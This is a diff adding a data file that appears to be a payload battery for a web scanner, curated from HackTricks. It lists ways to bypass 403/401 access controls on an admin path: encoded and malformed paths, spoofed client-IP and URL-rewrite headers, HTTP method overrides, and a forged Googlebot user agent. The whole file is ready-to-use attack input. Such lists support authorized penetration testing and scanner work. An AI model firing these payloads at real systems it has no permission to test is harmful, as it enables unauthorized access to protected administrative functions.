@@ -1,0 +1,30 @@
+# 403/401 bypass battery — hand-curated from HackTricks survey.
+# Format: TYPE|value — apply TYPE against a 403-baseline path, differential signal.
+PATH|/admin/ -> //admin
+PATH|/admin -> /./admin
+PATH|/admin -> /admin..;/
+PATH|/admin -> /admin;.css
+PATH|/admin -> /%2fadmin
+PATH|/admin -> /%252fadmin
+PATH|/admin -> /admin%20
+PATH|/admin -> /ADMIN (case flip)
+PATH|/admin -> /admin.json
+HEADER|X-Original-URL: /admin (request /)
+HEADER|X-Rewrite-URL: /admin (request /)
+HEADER|X-Forwarded-For: 127.0.0.1
+HEADER|X-Real-IP: 127.0.0.1
+HEADER|X-Originating-IP: 127.0.0.1
+HEADER|X-Remote-IP: 127.0.0.1
+HEADER|X-Client-IP: 127.0.0.1
+HEADER|X-Custom-IP-Authorization: 127.0.0.1
+HEADER|X-Forwarded-Host: localhost
+METHOD|POST
+METHOD|PUT
+METHOD|PATCH
+METHOD|DELETE
+METHOD|OPTIONS
+METHOD|HEAD
+HEADER|X-HTTP-Method-Override: PUT
+HEADER|X-Method-Override: PUT
+QUERY|_method=PUT
+UA|Googlebot/2.1 (+http://www.google.com/bot.html)
